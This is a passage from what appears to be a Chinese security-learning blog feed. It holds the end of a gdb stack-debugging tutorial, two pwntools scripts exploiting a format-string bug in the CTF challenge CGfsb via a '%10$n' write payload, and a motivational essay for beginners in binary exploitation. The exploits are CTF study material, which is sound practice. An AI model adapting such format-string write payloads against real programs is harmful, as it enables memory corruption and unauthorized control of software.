alt="5.png"><br>此时的backtrace是<br><img src="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/6.png" alt="6.png"><br>此时的栈是<br><img src="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/7.png" alt="7.png"><br>其中栈中的第一行为返回地址，这是创建printf栈帧后才出现的，其余两个参数不变。<br>我们再输入frame f 1<br><img src="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/8.png" alt="8.png"><br>使程序回到main栈帧，重复执行上述断点<br><img src="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/9.png" alt="9.png"><br>你会发现，返回地址无了。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>gdb调试时，要分清哪些是地址，哪些是数据，其中字符串信息的传递是通过指向字符串的地址传递的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串问题</title>
    <link href="/2021/04/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/"/>
    <url>/2021/04/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>今天又试了试攻防世界CGfsb的脚本，无意中发现了一个问题。</p><h4 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">&#x27;./CGfsb&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52117)</span></span><br><span class="line">pwnme_addr=0x0804A068 </span><br><span class="line">payload=p32(pwnme_addr)+<span class="string">&#x27;aaaa&#x27;</span>+<span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Sakura&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h4 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">&#x27;./CGfsb&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52117)</span></span><br><span class="line">pwnme_addr=0x0804A068 </span><br><span class="line">payload=p32(pwnme_addr)+p32(0)+<span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Sakura&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无意中是把payload中的4个aaaa改成了p32(0)就无法pwn掉了<br>不知道是什么原因无语~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Telling a crowd of pwner（告广大pwn友）</title>
    <link href="/2021/04/14/Telling-a-crowd-of-pwner/"/>
    <url>/2021/04/14/Telling-a-crowd-of-pwner/</url>
    
    <content type="html"><![CDATA[<p>最近一直观察跟我一起学pwn的朋友，过程十分痛苦。但是只能说，学pwn是一个漫长而又艰辛的过程，要<br>想练好武功，就要扎稳马步，切记急功近利，急于求成。因为，pwner需要的能力涉及广泛。虽然很多人<br>（包括我）在学习栈溢出、格式化字符串、整数溢出、堆溢出等各种招式时特别艰难，但是学习这些招式仅<br>仅是进入pwn海的第一步。在实际漏洞挖掘过程中，程序逻辑纷繁复杂，更需要pwn者将所学所有招式融汇<br>贯通，并且要有十分熟练的逆向功底（这里包括分析C语言和汇编语言程序逻辑的能力、调试能力、对底层<br>细节的掌控能力）。所以，我们入门者在学习pwn的过程中往往过于关注招式的变化，但是C语言、汇编、逆<br>向等能力基础不扎实（即马步不稳），但是这里面每一个能力的炼成都是极为艰难的，马步扎稳了还不够，更<br>要把毕生所学融汇贯通，在各种变换莫测的程序逻辑中利用这些漏洞就更需要高深的漏洞利用能力。所以，在<br>碰到学过招式，知道漏洞，利用不了的情况实属正常。如果把学pwn比作练武，C语言、汇编、逆向、python<br>就是根基，要扎好马步方可与人决斗。而各种漏洞则是招式，从栈溢出到堆溢出全部学完都不能保证你能驰<br>骋沙场。最好的方式就是边学招式边实战。实战是什么？你必须经常性地体验实际程序逻辑，把招式转化为<br>漏洞利用的能力，将战斗持续进行到底，这样才能在pwn海中提升自己的实战能力（即漏洞利用能力）。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="pwn海中的能力点"><a href="#pwn海中的能力点" class="headerlink" title="pwn海中的能力点"></a>pwn海中的能力点</h2><h3 id="1-扎马步：C语言、汇编、逆向调试、python"><a href="#1-扎马步：C语言、汇编、逆向调试、python" class="headerlink" title="1.扎马步：C语言、汇编、逆向调试、python"></a>1.扎马步：C语言、汇编、逆向调试、python</h3><h3 id="2-练招式：研究各种漏洞的利用技巧"><a href="#2-练招式：研究各种漏洞的利用技巧" class="headerlink" title="2.练招式：研究各种漏洞的利用技巧"></a>2.练招式：研究各种漏洞的利用技巧</h3><h3 id="3-实战：习惯性的阅读源码，分析程序逻辑，挖掘漏洞，利用漏洞。实战层面最为重要。"><a href="#3-实战：习惯性的阅读源码，分析程序逻辑，挖掘漏洞，利用漏洞。实战层面最为重要。" class="headerlink" title="3.实战：习惯性的阅读源码，分析程序逻辑，挖掘漏洞，利用漏洞。实战层面最为重要。"></a>3.实战：习惯性的阅读源码，分析程序逻辑，挖掘漏洞，利用漏洞。实战层面最为重要。</h3><p>Add:<br>所有的pwner都是不可埋没的人才，极具价值。但赛场只是擂台，磨炼功底。只要我们把时间跨度放得更宽，<br>更远，我们看到的应该不仅是赛场上那诱人的奖项，我们更应该看到属于我们诗和远方，那里自有容纳每一位<br>pwner的舞台，每一个pwner都将闪闪发光。</p>]]></content>
    
    
    
    <tags>
      
      <tag>有点情不自禁，但皆肺腑之言，望广大pwner携起手来一起前进</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
